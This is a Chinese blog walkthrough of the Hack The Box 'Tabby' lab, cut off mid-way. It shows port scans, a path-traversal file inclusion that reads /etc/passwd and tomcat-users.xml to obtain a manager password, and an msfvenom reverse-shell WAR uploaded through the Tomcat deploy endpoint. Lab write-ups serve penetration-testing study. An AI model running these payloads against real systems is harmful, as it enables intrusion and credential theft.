

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00 靶场技能介绍章节技能：本地文件包含、tomcat9用户配置文件查找、manager-script功能利用、zip2john 与 john 使用、lxd容器创建并将 Tabby 上的根文件系统挂载到容器中">
<meta property="og:type" content="article">
<meta property="og:title" content="Tabby-htb-writeup">
<meta property="og:url" content="https://sh1yan.top/2023/12/19/Tabby-htb-writeup/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="0x00 靶场技能介绍章节技能：本地文件包含、tomcat9用户配置文件查找、manager-script功能利用、zip2john 与 john 使用、lxd容器创建并将 Tabby 上的根文件系统挂载到容器中">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sh1yan.top/photo/Tabby-htb-writeup/1.png">
<meta property="og:image" content="http://sh1yan.top/photo/Tabby-htb-writeup/2.png">
<meta property="og:image" content="http://sh1yan.top/photo/Tabby-htb-writeup/3.png">
<meta property="og:image" content="http://sh1yan.top/photo/Tabby-htb-writeup/4.png">
<meta property="og:image" content="http://sh1yan.top/photo/Tabby-htb-writeup/5.png">
<meta property="article:published_time" content="2023-12-19T15:50:55.000Z">
<meta property="article:modified_time" content="2023-12-24T10:35:01.772Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="shooting-range">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://sh1yan.top/photo/Tabby-htb-writeup/1.png">
  
  
  
  <title>Tabby-htb-writeup - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Tabby-htb-writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-12-19 23:50" pubdate>
          2023年12月19日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          26k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          219 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Tabby-htb-writeup</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：本地文件包含、tomcat9用户配置文件查找、manager-script功能利用、zip2john 与 john 使用、lxd容器创建并将 Tabby 上的根文件系统挂载到容器中</p>
<span id="more"></span>  

<p>参考链接：<code>https://0xdf.gitlab.io/2020/11/07/htb-tabby.html</code></p>
<p>参考链接：<code>https://www.hackingarticles.in/lxd-privilege-escalation/</code></p>
<p>参考链接：<code>https://medium.com/@The_Hiker/hackthebox-tabby-walkthrough-thehiker-bec1f527ecb5</code></p>
<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.194</p>
<p>2、端口扫描下，获取下开放端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.194 | grep ^[0-9] | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;/&#x27;</span> -f 1 | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span> | sed s/,$//)<br>                                                                                         <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ nmap -sC -sV -p<span class="hljs-variable">$ports</span> 10.10.10.194<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-23 11:11 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.194<br>Host is up (0.29s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)<br>|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)<br>|_  256 1e:e7:b9:55:<span class="hljs-built_in">dd</span>:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Mega Hosting<br>8080/tcp open  http    Apache Tomcat<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-title: Apache Tomcat<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.70 seconds<br></code></pre></td></tr></table></figure>

<p>3、使用nikto工具获取下一些目标网站的信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nikto -host http://10.10.10.194                   <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.10.194<br>+ Target Hostname:    10.10.10.194<br>+ Target Port:        80<br>+ Start Time:         2023-12-23 11:17:49 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.41 (Ubuntu)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ 8052 requests: 1 error(s) and 4 item(s) reported on remote host<br>+ End Time:           2023-12-23 11:59:10 (GMT8) (2481 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

<p>4、查看下两个端口网站的页面信息</p>
<p><code>http://10.10.10.194</code></p>
<p><img src="http://sh1yan.top/photo/Tabby-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
<p><code>http://10.10.10.194:8080</code></p>
<p><img src="http://sh1yan.top/photo/Tabby-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/Tabby-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
<p>5、根据80端口页面源码信息，发现了一个特殊的URL访问地址</p>
<p><code>http://megahosting.htb/news.php?file=statement</code></p>
<p><img src="http://sh1yan.top/photo/Tabby-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
<p>6、本地先绑定下hosts信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.10.194 megahosting.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>[sudo] kali 的密码：<br>10.10.10.194 megahosting.htb<br></code></pre></td></tr></table></figure>

<p>7、通过研究这个URL地址，发现这个是一个涉及本地文件包含的漏洞地址，可以获取到靶机上的一些信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://megahosting.htb/news.php?file=../../../../../../../../etc/passwd<br><br>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin <span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bas<br></code></pre></td></tr></table></figure>

<p>8、但是由于权限的原因，获取的信息并不多，这里结合 8080 端口的绝对路径信息，我们可以尝试获取下一些tomcat 的配置信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ curl http://megahosting.htb/news.php?file=../../../../../../../../etc/tomcat9/tomcat-users.xml <br></code></pre></td></tr></table></figure>

<p>9、但是按照两个端口网站结合的信息来说，应该是让通过本地文件包含来获取账号配置信息，并登录tomcat的管理界面的，这里通过谷歌搜索成功获取到另一个配置目录的绝对地址，并且可以获取到一些信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ curl http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;!--<br>  Licensed to the Apache Software Foundation (ASF) under one or more<br>  contributor license agreements.  See the NOTICE file distributed with<br>  this work <span class="hljs-keyword">for</span> additional information regarding copyright ownership.<br>  The ASF licenses this file to You under the Apache License, Version 2.0<br>  (the <span class="hljs-string">&quot;License&quot;</span>); you may not use this file except <span class="hljs-keyword">in</span> compliance with<br>  the License.  You may obtain a copy of the License at<br><br>      http://www.apache.org/licenses/LICENSE-2.0<br><br>  Unless required by applicable law or agreed to <span class="hljs-keyword">in</span> writing, software<br>  distributed under the License is distributed on an <span class="hljs-string">&quot;AS IS&quot;</span> BASIS,<br>  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<br>  See the License <span class="hljs-keyword">for</span> the specific language governing permissions and<br>  limitations under the License.<br>--&gt;<br>&lt;tomcat-users xmlns=<span class="hljs-string">&quot;http://tomcat.apache.org/xml&quot;</span><br>              xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>              xsi:schemaLocation=<span class="hljs-string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span><br>              version=<span class="hljs-string">&quot;1.0&quot;</span>&gt;<br>&lt;!--<br>  NOTE:  By default, no user is included <span class="hljs-keyword">in</span> the <span class="hljs-string">&quot;manager-gui&quot;</span> role required<br>  to operate the <span class="hljs-string">&quot;/manager/html&quot;</span> web application.  If you wish to use this app,<br>  you must define such a user - the username and password are arbitrary. It is<br>  strongly recommended that you <span class="hljs-keyword">do</span> NOT use one of the <span class="hljs-built_in">users</span> <span class="hljs-keyword">in</span> the commented out<br>  section below since they are intended <span class="hljs-keyword">for</span> use with the examples web<br>  application.<br>--&gt;<br>&lt;!--<br>  NOTE:  The sample user and role entries below are intended <span class="hljs-keyword">for</span> use with the<br>  examples web application. They are wrapped <span class="hljs-keyword">in</span> a comment and thus are ignored<br>  when reading this file. If you wish to configure these <span class="hljs-built_in">users</span> <span class="hljs-keyword">for</span> use with the<br>  examples web application, <span class="hljs-keyword">do</span> not forget to remove the &lt;!.. ..&gt; that surrounds<br>  them. You will also need to <span class="hljs-built_in">set</span> the passwords to something appropriate.<br>--&gt;<br>&lt;!--<br>  &lt;role rolename=<span class="hljs-string">&quot;tomcat&quot;</span>/&gt;<br>  &lt;role rolename=<span class="hljs-string">&quot;role1&quot;</span>/&gt;<br>  &lt;user username=<span class="hljs-string">&quot;tomcat&quot;</span> password=<span class="hljs-string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="hljs-string">&quot;tomcat&quot;</span>/&gt;<br>  &lt;user username=<span class="hljs-string">&quot;both&quot;</span> password=<span class="hljs-string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="hljs-string">&quot;tomcat,role1&quot;</span>/&gt;<br>  &lt;user username=<span class="hljs-string">&quot;role1&quot;</span> password=<span class="hljs-string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="hljs-string">&quot;role1&quot;</span>/&gt;<br>--&gt;<br>   &lt;role rolename=<span class="hljs-string">&quot;admin-gui&quot;</span>/&gt;<br>   &lt;role rolename=<span class="hljs-string">&quot;manager-script&quot;</span>/&gt;<br>   &lt;user username=<span class="hljs-string">&quot;tomcat&quot;</span> password=<span class="hljs-string">&quot;<span class="hljs-variable">$3cureP4s5w0rd123</span>!&quot;</span> roles=<span class="hljs-string">&quot;admin-gui,manager-script&quot;</span>/&gt;<br>&lt;/tomcat-users&gt;<br></code></pre></td></tr></table></figure>

<p>10、到这里，我们获取到了Tomcat的密码：$3cureP4s5w0rd123!</p>
<p>11、通过尝试，发现该密码可以登录到以下管理路径</p>
<p><code>http://10.10.10.194:8080/host-manager/html</code></p>
<p><img src="http://sh1yan.top/photo/Tabby-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
<p>12、到这里正常来说是通过这个页面进行提权的，但是各种搜集枚举，并没有发现什么提权方法，且各种目录扫描也没有发现任何有用信息，这个时候已经陷入到兔子洞的范畴了</p>
<p>13、通过查看演示文档，发现了别人通过目录枚举能获取到以下一个关键的功能目录地址</p>
<p><code>http://localhost:8080/manager/text/deploy?path=/foo</code></p>
<p>14、通过检索相关技术文档，发现这个是一个可以上传并部署war的一个接口功能</p>
<p><code>manager-script 权限是 Apache Tomcat 的 Manager App 的一个角色，允许用户通过 HTTP 协议使用命令行工具（如 curl 或 wget）或脚本（如 Ant 脚本）与 Tomcat 的管理接口进行交互。</code></p>
<p><code>Manager App 是一个 Web 应用程序，提供了对 Tomcat 运行时状态的访问和管理功能。manager-script 角色允许用户通过命令行方式执行以下操作：</code></p>
<p><code>部署和卸载 Web 应用程序（WAR 文件）： 用户可以使用 HTTP PUT 请求将 WAR 文件部署到 Tomcat，并使用 HTTP DELETE 请求卸载已部署的应用程序。</code></p>
<p><code>查看和操作部署的应用程序状态： 用户可以通过 HTTP 请求查看已部署应用程序的状态，如启动、停止或重新启动。</code></p>
<p><code>访问 Server Status 页面： 用户可以通过 HTTP 请求获取 Tomcat 服务器的当前状态信息。</code></p>
<p><code>这个权限对于通过自动化脚本或工具来管理和部署应用程序非常有用，因为它提供了一种程序化的方式来与 Tomcat 交互。然而，由于这个权限涉及对 Tomcat 管理接口的访问，因此在生产环境中应该小心配置，确保只有受信任的用户或系统能够访问这些功能。</code></p>
<p>15、通过这个信息，开始检索所有能利用的具体方法演示描述</p>
<p><code>https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely</code></p>
<p><code>使用 curl 部署 WAR 文件到 Tomcat 的 Manager App 需要以下步骤：</code></p>
<p><code>准备 WAR 文件： 确保你有一个有效的 WAR 文件，这是你要部署的 Web 应用程序。</code></p>
<p><code>构造 curl 命令： 使用 curl 命令向 Tomcat 的 Manager App 发送 HTTP PUT 请求来部署 WAR 文件。以下是一个示例命令：</code></p>
<p><code>curl -v -u username:password -T path/to/your/app.war http://localhost:8080/manager/text/deploy?path=/contextPath</code></p>
<p><code>-v: 显示详细信息，包括 HTTP 请求和响应头。</code><br><code>-u username:password: 提供 Tomcat Manager 的用户名和密码。</code><br><code>-T path/to/your/app.war: 指定要上传的 WAR 文件的路径。</code><br><code>http://localhost:8080/manager/text/deploy?path=/contextPath: 指定 Manager App 的部署路径，其中 http://localhost:8080 是你的 Tomcat 地址，/manager/text/deploy 是 Manager App 的文本接口路径，/contextPath 是你要部署应用程序的上下文路径。</code><br><code>执行 curl 命令： 执行构造的 curl 命令，发送 PUT 请求并部署 WAR 文件。确保替换命令中的用户名、密码、WAR 文件路径和 Tomcat 地址等参数。</code></p>
<p><code>示例：</code></p>
<p><code>curl -v -u admin:admin -T path/to/your/app.war http://localhost:8080/manager/text/deploy?path=/yourapp</code></p>
<p><code>请注意，这是一个基本示例，实际情况可能需要根据你的 Tomcat 配置和安全性要求进行调整。确保你已经正确配置 Tomcat Manager 用户，并且只允许受信任的用户访问 Manager App。</code></p>
<p>16、接下来开始使用 msfvenom 生成一个反弹shell的 .war 包文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f war -o shell.war <br>Payload size: 1093 bytes<br>Final size of war file: 1093 bytes<br>Saved as: shell.war<br></code></pre></td></tr></table></figure>

<p>17、使用curl工具进行上次我们的war包文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ curl -v -u <span class="hljs-string">&#x27;tomcat:$3cureP4s5w0rd123!&#x27;</span> -T shell.war http://10.10.10.194:8080/manager/text/deploy?path=/shell<br>*   Trying 10.10.10.194:8080...<br>* Connected to 10.10.10.194 (10.10.10.194) port 8080<br>* Server auth using Basic with user <span class="hljs-string">&#x27;tomcat&#x27;</span><br>&gt; PUT /manager/text/deploy?path=/shell HTTP/1.1<br>&gt; Host: 10.10.10.194:8080<br>&gt; Authorization: Basic dG9tY2F0OiQzY3VyZVA0czV3MHJkMTIzIQ==<br>&gt; User-Agent: curl/8.4.0<br>&gt; Accept: */*<br>&gt; Content-Length: 1093<br>&gt; <br>* We are completely uploaded and fine<br>&lt; HTTP/1.1 200 <br>&lt; Cache-Control: private<br>&lt; Expires: Thu, 01 Jan 1970 00:00:00 GMT<br>&lt; X-Content-Type-Options: nosniff<br>&lt; Content-Type: text/plain;charset=utf-8<br>&lt; Transfer-Encoding: chunked<br>&lt; Date: Sat, 23 Dec 2023 